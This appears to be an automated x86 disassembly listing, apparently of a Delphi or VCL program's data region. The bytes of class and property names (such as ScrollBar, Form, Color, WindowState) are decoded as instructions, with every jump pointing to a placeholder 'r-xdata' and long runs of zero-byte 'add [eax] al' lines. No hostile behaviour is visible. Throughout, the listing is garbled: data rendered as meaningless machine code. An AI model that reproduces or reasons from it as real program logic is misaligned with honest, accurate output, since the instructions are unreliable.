call sub_4060f8
sub_439608
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
inc ebx
add eax 0x6d726f46
outsb
arpl [ ebx ] ax
add [ eax ] eax
add [ eax ] al
inc [ ecx ]
add [ 0x6f6c6f43 ] al
outsd
insb
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
inc ecx
add [ esi + edi * 4 + 0x54110043 ] dh
lahf
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + edx * 4 + 0x43 ] bl
add [ eax ] cl
add [ eax ] al
and [ ebp + 0x41 ] dh
add [ eax - 0x5bffbfb8 ] bl
dec eax
inc eax
add [ eax - 0x53ffbfb8 ] ch
dec eax
inc eax
add [ eax - 0x17ffbfb8 ] ah
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ esi + ebx * 4 ] dl
inc ecx
add [ edi + ebx * 4 ] ah
inc ecx
add [ edi + ebx * 4 ] ch
xchg esi eax
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + edx * 4 + 0x43 ] dh
insb
inc edx
popad
jb r-xdata
xchg ebp eax
inc ebx
add [ eax ] cl
add [ eax ] al
dec [ eax ]
add [ eax ] al
[ esi + edi * 4 + 0x43 ]
jb r-xdata
shl [ esi + edx * 4 + 0x43 ] 0x0
pop es
jb r-xdata
add eax 0x6f6c6f43
xchg esi eax
inc ebx
add [ ebp + esi * 2 + 0xd0041 ] dl
add eax 0x6d726f46
jae r-xdata
inc ebx
outsd
outsb
je r-xdata
push esp
arpl [ ebx + 0x5 ] bp
inc esi
outsd
jb r-xdata
add [ eax ] al
add [ eax + 0x8 ] al
add al [ eax ]
or [ ecx + 0x6e ] ecx
arpl [ edx + 0x65 ] si
insd
outsb
je r-xdata
outsd
insb
push ebx
arpl [ edx + 0x6f ] si
insb
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ edx + 0x75 ]
je r-xdata
add [ eax + edx ] bh
inc eax
add [ eax + eax ] ah
add bh bh
movsb [ edi ] [ esi ]
lds eax [ ebx ]
je sub_439608
jae r-xdata
outsb
cmp al 0x10
inc eax
add [ eax ] dl
add [ eax ] al
[ edi + eax * 8 + 0x43 ]
adc [ eax ] al
sbb al [ eax ]
add bh bh
sbb al [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
push es
dec ebp
popad
jb r-xdata
mov [ ebx ] 0x1
outsd
outsb
push ebx
imul edi [ edx + 0x65 ] r-xdata
sub [ eax ] al
add bh bh
call 0x143da90
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax + eax ] 0x0
adc [ ebx + eax * 2 + 0x6f ] edx
outsb
je r-xdata
inc ebx
add [ edi ] al
popad
outsb
add [ gs : bx + si ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al 0x0
or edx [ eax + 0x61 ]
jb r-xdata
imul ebp [ esi ] 0x2c004010
add [ eax ] al
inc [ esi + eax * 8 ]
inc ebx
add [ ecx ] al
push ebx
insd
outsd
outsd
je r-xdata
outsb
je r-xdata
add [ eax ] al
[ 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
cmp al 0x10
inc eax
add [ eax ] dh
add [ eax ] al
jmp eax
outsd
insb
outsd
jb r-xdata
add [ eax + ecx * 2 + 0x8c0040 ] ah
inc edx
add [ eax + ecx * 2 + 0x5c140040 ] ch
inc ebp
add al ch
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax ] bh
0x43
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax - 0x68 ] bl
inc ebx
add [ eax ] cl
ja r-xdata
inc eax
add [ edi ] bl
add [ eax ] al
[ edi ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop es
add [ esi ] al
add eax 0x676e6152
add [ gs : eax ] dl
adc [ eax ] al
or al 0x0
add bh bh
sbb al 0xc6
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x6f500800
jae r-xdata
xchg ecx eax
inc ebp
add ah al
dec esp
inc ebp
add [ eax - 0x62 ] al
inc ecx
add [ eax + 0x4800452f ] bh
dec esi
outsd
jb r-xdata
add [ eax ] al
je r-xdata
add ah al
popad
insb
or esi [ edi + 0x73 ]
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
or esi [ fs : edi + 0x73 ]
dec ebp
popad
js r-xdata
jmp [ edi + eax * 8 ]
outsd
inc edi
inc ebp
add [ eax + edi ] ch
inc ebp
add [ esi + eax + 0x45 ] bh
add [ eax + 0x7 ] ch
dec eax
insd
imul edi [ edx + 0x65 ] 0x6f460564
jb r-xdata
inc edx
add [ esp + eax + 0x42 ] cl
add [ esp + eax + 0x42 ] al
add [ eax + 0x7 ] dh
inc edx
add al al
leave
inc ebx
add al ch
mov eax [ ebp ]
hlt
jae r-xdata
or [ edx + esi * 2 + 0x61 ] dl
arpl [ ebx + 0x69 ] bp
outsb
add [ bx + si ] dl
inc eax
add [ eax + eax ] bl
add bh bh
nop
mov [ ebx ] 0x1
add [ eax ] al
add [ eax + 0x1 ] al
or al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x8d656c62
inc eax
add [ eax + ebx * 4 + 0x43 ] bl
add [ ebx ] al
or al 0x54
push edi
imul ebp [ esi + 0x64 ] 0x7453776f
popad
je r-xdata
shr ah 0x98
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
0x43 0x0
add [ eax ] al
add [ eax ] al
rcr [ ecx - 0x6609ffbd ] 0x1
inc ebx
add [ edx + eax ] ah
add [ eax - 0x38 ] ah
inc esp
add [ eax + 0x7 ] dl
inc edx
sub_439965
push esi
inc ebp
add al bh
xor [ ebp ] eax
and [ ebp + eax * 2 + 0x4584e000 ] al
add ah dl
jg r-xdata
in al 0x99
inc ebp
add [ ebp + eax * 4 + 0x45 ] dh
add ah ah
0x43
add ah al
test [ ebp ] al
add al 0xd1
inc ebx
add ah al
0x43
sub_439984
sub al 0x4e
inc ebp
add [ edx + ecx * 8 + 0x43 ] dh
add [ ebx + ecx * 2 ] al
inc ebp
add [ edx + ecx * 8 + 0x4ec40043 ] al
inc ebp
add al ch
dec esi
inc ebp
add [ edi + ecx * 2 + 0x45 ] bh
add [ eax + 0x2000454d ] al
dec ebp
inc ebp
add [ eax ] ah
cdq
inc ebp
add [ esi + eax * 4 ] cl
inc ebp
add al al
pop esi
inc ebp
add [ eax + ebx * 4 - 0x7d83ffbb ] dl
inc ebp
add ah ah
cdq
inc ebp
add [ ebp + eax * 4 + 0x45 ] dh
add ah ah
0x43
sub_4399dc
mov edi 0x43cfccff
add [ eax + edx * 8 - 0x2f1fffbd ] bh
inc ebx
add [ ecx + edx * 8 - 0x305bffbd ] al
inc ebx
add [ ebx + ecx * 8 ] al
inc ebx
add [ esp + edx * 2 ] dl
push ebx
arpl [ edx + 0x6f ] si
insb
insb
imul ebp [ esi + 0x67 ] 0x436e6957
outsd
outsb
je r-xdata
add [ eax ] al
or [ esi ] 0x0
cmovg ebp [ esi + 0x41 ]
outsd
insb
nop
adc [ edx + 0x14070043 ] bl
push esp
push ebx
arpl [ edx + 0x6f ] si
insb
insb
imul ebp [ esi + 0x67 ] 0x436e6957
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add eax 0xe0000000
outsd
outsb
jo r-xdata
add bh bh
jl r-xdata
outsd
insb
in al dx
cwde
int3
imul edi [ edx + 0x65 ] 0x656c6261
or [ edx + 0x73 ] ah
inc esp
imul esp [ ecx + 0x6c ] 0x620c676f
inc ebx
add [ eax - 0x34 ] cl
inc esp
add [ ecx ] dl
add [ 0x6d726f46 ] al
jae r-xdata
inc ebx
add [ eax + 0x2 ] dl
insb
imul esp [ edi + 0x6e ] 0x69736f50
je r-xdata
nop
mov [ eax + eax + 0x30 ] 0x30ff0002
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0f000e ] al
outsb
inc ecx
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x480d000f ] al
outsd
jb r-xdata
add [ eax ] ch
add al [ eax ]
[ eax ]
add [ eax ] ch
mov [ eax + eax + 0x28 ] 0x28ff0002
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f13000d ] al
outsb
inc ecx
insb
imul esp [ edi + 0x6e ] 0x65736e49
jb r-xdata
add [ edi ] cl
outsd
outsd
insb
push edi
imul ebp [ esi + 0x64 ] 0x620d776f
jae r-xdata
jae r-xdata
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
jb r-xdata
inc edx
outsw
jb r-xdata
jae r-xdata
xor al 0x11
inc eax
add [ ecx ] al
shl ecx 0x2
adc [ eax ] eax
add ecx eax
loope r-xdata
imul edi [ edx + 0x65 ] 0x6c6f6f54
push edi
imul ebp [ esi + 0x5 ] 0x6d726f46
xchg esi eax
inc ebx
add [ edx + eax ] dl
dec [ esp + ecx * 8 + 0x10043 ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] al
or eax 0x74726556
add [ edi ] cl
or eax 0x73654449
imul esp [ edi + 0x6e ] 0x6f487265
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
add [ eax ] 0x0
add [ eax + 0x560d0010 ] al
bound ebp [ ecx + 0x53 ]
jns r-xdata
outsd
jb r-xdata
jb r-xdata
jae r-xdata
push edx
int 0xda
rcl [ ecx ] 0x1
sahf
cmpsb [ esi ] [ edi ]
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4605da82
fwait
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
0x10030043 0x4654
outsd
jb r-xdata
or [ ecx + 0x4f ] cl
insb
inc esi
outsd
jb r-xdata
add bh bh
dec [ ebx + 0x439b80c0 ]
insb
je r-xdata
push es
popad
insb
or ah [ esi + 0x73 ]
dec ebp
outsd
jb r-xdata
or esp [ esi + 0x73 ]
dec [ ebp - 0x644fffc0 ]
inc ebx
add [ ecx ] dl
push cs
push esp
add bh bh
outsd
imul ebp [ eax - 0x80 ] 0x41
add [ ecx ] al
movsd [ edi ] [ esi ]
sbb eax 0x2bea1e43
out 0x4d eax
mov [ 0xfffffffffd45cc30 ] eax
outsd
inc edx
outsd
jb r-xdata
adc [ eax + 0x6f ] esi
jo r-xdata
outsb
or [ fs : eax + 0x6f ] esi
inc esp
popa
jne r-xdata
insd
mov eax eax
jl r-xdata
inc esi
outsd
jb r-xdata
insd
imul edi [ edx + 0x65 ] 0x4d69620a
inc esp
dec ecx
inc esi
push ebx
arpl [ edx + 0x65 ] si
outsb
inc ebx
outsb
je r-xdata
jb r-xdata
inc ebx
add [ esi ] al
jns r-xdata
add ecx [ ebx ]
push esp
inc edx
jo r-xdata
outsb
jb r-xdata
jb r-xdata
add [ eax ] al
add [ ebx * 4 + 0x64090043 ] ch
insd
je r-xdata
inc esp
popa
inc esp
popa
jne r-xdata
xor [ ebp + 0xf030043 ] bl
je r-xdata
popad
js r-xdata
or ah [ edx + 0x69 ]
dec ebp
bound ebp [ ecx + 0x4d ]
imul ebp [ esi + 0x69 ] 0x657a696d
push ebx
je r-xdata
insb
jns r-xdata
jae r-xdata
dec edi
insb
jo r-xdata
insd
imul edi [ edx + 0x65 ] 0x48696206
jo r-xdata
jb r-xdata
outsb
insb
jns r-xdata
arpl [ edi + 0x6e ] bp
jae r-xdata
bound ebp [ ecx + 0x48 ]
outsb
push esp
outsd
jo r-xdata
push eax
outsd
jb r-xdata
outsd
outsb
inc ecx
jb r-xdata
outsd
jb r-xdata
inc esi
jb r-xdata
je r-xdata
je r-xdata
je r-xdata
push esp
add ecx [ edi ]
imul edi [ edx + 0x65 ] 0x796c6e4f
push cs
je r-xdata
jne r-xdata
popad
je r-xdata
pshufw mm5 [ edi + 0x44 ] 0x65
jae r-xdata
jo r-xdata
inc esp
dec ecx
inc ebx
push 0x9646c69
jae r-xdata
or al 0x54
sar [ esp + ebx * 4 + 0x43 ] 0x0
push es
push cs
jo r-xdata
or ah [ ebp + ebp * 2 + 0x4d ]
insd
push eax
adc [ eax + 0x6f ] dh
jo r-xdata
pushfd
inc ebx
add [ eax + r-xdata ] dl
add ecx [ ecx ]
push esp
jae r-xdata
sub [ ebx + eax * 2 - 0x636b7000 ] bl
jb r-xdata
lea eax [ eax ]
sub al 0x9c
inc esi
outsd
jb r-xdata
jo r-xdata
je r-xdata
inc edx
dec ebp
outsb
jne r-xdata
arpl [ edi + 0x6e ] bp
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] ch
pushfd
inc ebx
add [ edx ] cl
imul edx [ ebx + 0x79 ] 0x6d657473
outsd
popad
jns r-xdata
outsd
jo r-xdata
jae r-xdata
das
mov cl 0xec
add eax 0x6d726f46
jae r-xdata
0x62060043 0x4e73
outsd
outsb
or [ gs : edx + 0x73 ] ah
push ebx
imul ebp [ esi + 0x67 ] 0x620a656c
jae r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ 0xffffffffe0000000 ] al
nop
inc esi
outsd
jb r-xdata
jae r-xdata
outsd
inc ebx
insb
push eax
jb r-xdata
jb r-xdata
outsd
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x1
inc esi
outsd
jae r-xdata
popad
dec ebp
je r-xdata
inc esp
jae r-xdata
add [ eax ] al
add eax [ eax ]
add [ eax ] al
sub al 0x9d
inc ebx
add [ ecx ] cl
insd
inc esp
popa
jne r-xdata
push es
add eax 0x6d726f46
jae r-xdata
insd
popad
jb r-xdata
jb r-xdata
jb r-xdata
inc esp
jae r-xdata
inc ebx
add [ ebx ] al
or [ eax + edx * 2 + 0x6f ] edx
pushfd
jae r-xdata
inc esi
outsd
dec ebp
popad
imul ebp [ esi + 0x46 ] 0x436d726f
outsb
je r-xdata
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ edi ] al
add [ eax ] al
add [ eax + 0xa00439c ] dl
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add bh bh
add [ esi ] eax
jb r-xdata
or [ ebp + ebp * 2 + 0x50 ] esp
int3
inc ebx
insb
outsd
inc ebp
jbe r-xdata
jae r-xdata
jo r-xdata
push es
arpl [ ecx + 0x46 ] sp
jb r-xdata
outsb
je r-xdata
arpl [ ecx + 0x6c ] sp
inc ebx
outsb
je r-xdata
jb r-xdata
jb r-xdata
jo r-xdata
jo r-xdata
popfd
inc ebx
add [ esi ] al
outsd
inc eax
add [ esi + ebx * 4 ] dl
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0x600439d ] al
popfd
inc ebx
add [ ebx ] al
or edx [ eax + edx * 2 + 0x72 ]
imul ebp [ esi + 0x74 ] 0x6c616353
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
enter 0x439d 0x0
add eax 0x6d726f46
jo r-xdata
push eax
inc ebx
add [ ebx ] al
or edx [ edx + eax * 2 + 0x6f ]
inc eax
add [ esp + ebx * 4 ] ch
inc esp
jae r-xdata
inc ebp
jbe r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ ecx + edx ] dl
inc eax
add al cl
popfd
inc ebx
add [ ebp - 0x61a7ffc0 ] cl
inc ebx
add [ eax ] cl
adc [ ebx + eax * 2 + 0x6c ] dl
outsd
jae r-xdata
insd
popad
outsb
add al 0x57
outsd
jb r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] dl
inc eax
add [ eax ] al
adc [ eax ] al
nop
pushfd
sahf
inc ebx
add [ eax ] cl
push cs
push esp
push ebx
push 0x4374726f
jne r-xdata
jae r-xdata
outsb
je r-xdata
jb r-xdata
push ecx
jne r-xdata
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
add eax 0x6d726f46
jae r-xdata
or ah [ gs : ebx + 0x61 ]
arpl [ ecx + 0x4e ] sp
outsd
outsb
push es
arpl [ ecx + 0x48 ] sp
imul esp [ ebp + 0x6 ] 0x72466163
or ah [ gs : ebx + 0x61 ]
add [ eax ] al
add al cl
popfd
inc ebx
add [ esi ] al
inc ebx
add [ eax ] cl
or edx [ ebx + eax * 2 + 0x6c ]
adc al 0x9e
jo r-xdata
dec esi
outsd
outsb
push cs
jb r-xdata
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
or al 0x64
insd
add [ ebx ] al
add [ eax ] eax
add [ eax ] al
outsb
je r-xdata
imul ebp [ ebp + 0x61 ] 0x640a7972
insd
popfd
inc ebx
add [ ebx ] al
andps xmm0 [ ebp + 0x66 ]
push esp
push eax
dec edi
ja r-xdata
outsd
insb
popad
outsb
outsb
je r-xdata
outsd
outsd
insb
jne r-xdata
add [ esp + eax * 2 ] al
popad
je r-xdata
outsb
add [ eax ] dl
inc eax
add [ eax ] al
push 0x3c004010
adc [ eax ] al
add [ eax ] dl
inc eax
add [ ebp - 0x60cbffc0 ] cl
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
or [ esi ] al
imul ebp [ edi + 0x6e ] 0x700c6c61
outsd
push eax
jb r-xdata
popad
outsb
add [ eax ] al
jb r-xdata
inc esi
outsd
jb r-xdata
imul ebp [ esi + 0x46 ] 0xc6d726f
insd
jb r-xdata
jb r-xdata
add al 0x46
jo r-xdata
add dl [ ecx ]
add ecx [ ebp + 0x73 ]
push es
push esp
push edi
dec ebp
dec ebx
jns r-xdata
inc ebx
add [ ebx ] al
or dl [ eax + edx * 2 + 0x6f ]
jo r-xdata
cmp al 0x10
inc eax
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
xor al 0x9f
jbe r-xdata
add [ eax + 0x7 ] ch
inc edx
add [ esi ] al
inc ebx
add [ esi + eax + 0x45 ] bh
outsd
or dh [ eax + 0x6d ]
inc ebp
js r-xdata
pop es
dec ecx
outsb
je r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
or al 0x54
inc ebx
insb
outsd
jae r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
outsb
je r-xdata
jo r-xdata
inc ebp
jbe r-xdata
add [ eax ] al
sbb [ ebp + 0x70060043 ] 0x6f
jae r-xdata
adc [ eax + 0x6f ] esi
insd
outsd
inc eax
add [ esi + edx * 8 ] cl
inc ebx
add ah al
xchg ecx eax
inc ebp
add al bl
inc ebx
add [ edx - 0x5e ] bh
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] dh
lahf
inc ebx
add [ esi ] al
jo r-xdata
dec eax
popad
outsb
insb
pop es
inc edx
pop es
add [ eax ] al
xor [ edi + 0x70060043 ] bl
insd
outsb
je r-xdata
inc ebp
push es
insb
imul esp [ ebx + 0x69 ] 0x6f460574
jb r-xdata
inc ebx
add [ ebx + eax ] bl
add [ eax + 0x50004398 ] ah
pop es
inc edx
add [ eax - 0x5bffbc2d ] ah
aad 0x43
add [ eax + ecx * 2 + 0xa6c0040 ] ch
inc esp
add al ch
inc ebp
inc eax
add [ esi + eax * 2 ] al
imul esi [ ebp + eax + 0x46 ] 0x736d726f
mov eax 0x439f
jb r-xdata
sahf
outsd
inc esi
imul esi [ ebp + eax + 0x46 ] 0x736d726f
add [ eax ] al
add [ eax ] al
adc [ eax ] al
fcomp [ esi + 0xa080043 ]
push esp
dec eax
insb
outsb
je r-xdata
fadd [ ebx ]
inc eax
sahf
inc ecx
add [ eax + ebx * 8 ] al
dec esi
outsd
outsb
push es
jo r-xdata
inc ebx
add [ eax - 0x28 ] ch
inc ebx
add [ ecx + ebx * 8 + 0x67c0043 ] ah
add al 0xd8
inc ecx
add [ edi ] al
inc ebx
outsd
insd
add eax [ eax ]
pop es
inc ebx
add [ esp + eax + 0x42 ] al
add [ ebx + esi - 0x2debffbc ] ch
inc ebx
add al ch
mov eax [ ebp ]
hlt
add al 0xe6
jae r-xdata
inc ebx
popad
insb
insb
dec eax
insb
jo r-xdata
or [ ebx + 0x61 ] al
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x5d73ffbd ] bh
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh ah
mov al [ 0xffffffffa27a0043 ]
lahf
inc ebx
add [ eax ] al
pop es
inc edx
outsd
outsd
insb
popad
inc edx
outsd
add [ eax ] ecx
inc ebx
popad
outsb
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
sub_439dc9
popfd
inc ebx
add [ ebx ] al
or al 0x54
inc ebx
insb
outsd
jae r-xdata
outsd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add al cl
popfd
inc ebx
add [ esi ] al
arpl [ ecx + 0x4e ] sp
outsd
outsb
push es
arpl [ ecx + 0x48 ] sp
imul esp [ ebp + 0x6 ] 0x72466163
or ah [ gs : ebx + 0x61 ]
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
add eax 0x6d726f46
jae r-xdata
inc ebp
jbe r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ ecx + edx ] dl
inc eax
add al cl
popfd
inc ebx
add [ ebp - 0x61a7ffc0 ] cl
inc ebx
add [ eax ] cl
adc [ ebx + eax * 2 + 0x6c ] dl
outsd
jae r-xdata
popfd
inc ebx
add [ esi ] al
jo r-xdata
inc eax
add [ esi + ebx * 4 ] dl
outsd
insb
popad
outsb
outsb
je r-xdata
outsd
outsd
insb
push ecx
jne r-xdata
inc ebx
add [ eax ] cl
or edx [ ebx + eax * 2 + 0x6c ]
adc al 0x9e
dec esi
outsd
outsb
push cs
jo r-xdata
inc ebx
insb
outsd
inc ebp
jbe r-xdata
add al 0x46
jo r-xdata
add dl [ ecx ]
add ecx [ ebp + 0x73 ]
push es
push esp
push edi
dec ebp
dec ebx
jns r-xdata
inc ebx
add [ ebx ] al
or dl [ eax + edx * 2 + 0x6f ]
jo r-xdata
cmp al 0x10
inc eax
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
xor al 0x9f
jbe r-xdata
popad
outsb
add [ eax ] al
jb r-xdata
outsd
inc ebx
insb
push eax
jb r-xdata
insd
popad
outsb
add al 0x57
outsd
jb r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] dl
inc eax
add [ eax ] al
adc [ eax ] al
nop
pushfd
sahf
inc ebx
add [ eax ] cl
push cs
push esp
push ebx
push 0x4374726f
jne r-xdata
jae r-xdata
outsb
je r-xdata
inc eax
add [ esi + edx * 8 ] cl
inc ebx
add ah al
xchg ecx eax
inc ebp
add al bl
inc ebx
add [ edx - 0x5e ] bh
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] dh
lahf
inc ebx
add [ esi ] al
jo r-xdata
dec eax
popad
outsb
insb
pop es
inc edx
pop es
add [ eax ] al
xor [ edi + 0x70060043 ] bl
insd
outsb
je r-xdata
jo r-xdata
inc ebp
jbe r-xdata
jae r-xdata
jo r-xdata
jne r-xdata
add [ esp + eax * 2 ] al
popad
je r-xdata
outsb
add [ eax ] dl
inc eax
add [ eax ] al
push 0x3c004010
adc [ eax ] al
add [ eax ] dl
inc eax
add [ ebp - 0x60cbffc0 ] cl
add cl [ eax ]
push es
fadd [ ebx ]
inc eax
sahf
inc ecx
add [ eax + ebx * 8 ] al
dec esi
outsd
outsb
push es
jo r-xdata
inc ebx
add [ eax - 0x28 ] ch
inc ebx
add [ ecx + ebx * 8 + 0x67c0043 ] ah
add al 0xd8
inc ecx
add [ edi ] al
inc ebx
outsd
insd
add eax [ eax ]
pop es
add [ eax ] al
add [ eax ] al
adc [ eax ] al
fcomp [ esi + 0xa080043 ]
push esp
dec eax
insb
outsb
je r-xdata
jb r-xdata
add [ eax + 0x7 ] ch
inc edx
add [ esi ] al
inc ebx
add [ esi + eax + 0x45 ] bh
outsd
or dh [ eax + 0x6d ]
inc ebp
js r-xdata
pop es
dec ecx
outsb
je r-xdata
outsb
or al 0x54
inc ebx
insb
outsd
jae r-xdata
add [ esi ] eax
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
push ebx
outsb
jb r-xdata
or [ esi ] al
imul ebp [ edi + 0x6e ] 0x700c6c61
outsd
push eax
jb r-xdata
inc ebp
push es
insb
imul esp [ ebx + 0x69 ] 0x6f460574
jb r-xdata
inc ebx
add [ ebx + eax ] bl
add [ eax + 0x50004398 ] ah
pop es
inc edx
add [ eax - 0x5bffbc2d ] ah
aad 0x43
add [ eax + ecx * 2 + 0xa6c0040 ] ch
inc esp
add al ch
inc ebp
inc eax
add [ esi + eax * 2 ] al
imul esi [ ebp + eax + 0x46 ] 0x736d726f
mov eax 0x439f
jb r-xdata
add [ eax ] ecx
inc ebx
popad
outsb
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
outsb
je r-xdata
inc ebx
add [ esp + eax + 0x42 ] al
add [ ebx + esi - 0x2debffbc ] ch
inc ebx
add al ch
mov eax [ ebp ]
hlt
add al 0xe6
jae r-xdata
inc ebx
popad
insb
insb
dec eax
insb
jo r-xdata
or [ ebx + 0x61 ] al
sahf
outsd
inc esi
imul esi [ ebp + eax + 0x46 ] 0x736d726f
nop
int3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x5d73ffbd ] bh
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh ah
mov al [ 0xffffffffa27a0043 ]
lahf
inc ebx
add [ eax ] al
pop es
inc edx
outsd
outsd
insb
popad
inc edx
outsd
sub_43a094
xchg esp eax
int 0x43
add [ eax ] cl
sbb al [ eax + eax + 0x28 ]
xlat
inc ebx
add [ edi + edx * 8 + 0x30100043 ] ah
inc esp
add al bl
rol [ ebx ] cl
test al 0x2a
inc esp
add ah bh
or eax [ eax + eax - 0x64 ]
sub al 0x44
add [ ebp + 0x43 ] al
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
xchg esp eax
adc [ eax ] al
test [ edx ] al
add [ eax ] al
dec eax
fwait
inc ebx
add [ eax + 0x7c000002 ] bl
fwait
inc ebx
add [ edx + eax - 0x64540000 ] ch
inc ebx
add [ ebx + eax ] bh
add [ eax ] al
inc ebx
add [ edi ] cl
add [ ebp + 0x27001400 ] al
add [ edi ] dh
add [ ecx - 0x5eff7c00 ] al
add [ edx ] al
add [ ecx ] dl
add [ edi ] edx
add [ eax ] esp
add [ edi ] ebx
add [ esi ] eax
add [ eax ] dl
add [ ecx ] dl
add [ edx ] dl
add [ eax ] ebx
add [ edx ] ah
add ch [ eax ]
add [ ecx ] dl
add dl [ ebx ]
and al 0x0
sbb al [ eax ]
inc esi
add [ ebx + 0x3fb04000 ] al
mov al 0x0
mov al 0x17
mov al 0x3c
mov al 0x1
mov al 0x5
mov al 0xd
mov al 0x10
mov al 0xe
mov al 0x15
mov al 0x19
mov al 0x1d
mov al 0x21
mov al 0x12
mov al 0x29
mov al 0x3d
mov al 0x8
mov al 0x48
mov al 0x44
mov al 0xb0
[ edi - 0x13001201 ]
sub_43a2ec
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
movsb [ edi ] [ esi ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
movsb [ edi ] [ esi ]
inc ebx
add [ eax + 0x3 ] ah
add [ eax ] al
insb
lahf
inc ebx
add [ eax + 0x7 ] dl
inc edx
add [ eax - 0x5bffbc2d ] ah
aad 0x43
add [ eax + ecx * 2 + 0xa6c0040 ] ch
inc esp
add al ch
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ esi + edx * 8 ] cl
inc ebx
add ah al
xchg ecx eax
inc ebp
add al bl
fadd [ ebx ]
inc eax
sahf
inc ecx
add [ eax + ebx * 8 ] al
inc ebx
add [ eax - 0x28 ] ch
inc ebx
add [ ecx + ebx * 8 + 0x67c0043 ] ah
inc ebp
add [ eax + 0x7 ] ch
inc edx
add [ esi ] al
inc ebx
add [ esp + eax + 0x42 ] al
add [ ebx + esi - 0x2debffbc ] ch
inc ebx
add al ch
mov eax [ ebp ]
hlt
sub_43a480
inc esp
add [ eax + 0x2 ] ch
add bh bh
ror [ edx ] 0x1
inc esp
add [ eax + 0x43f6 ] ch
add [ eax ] al
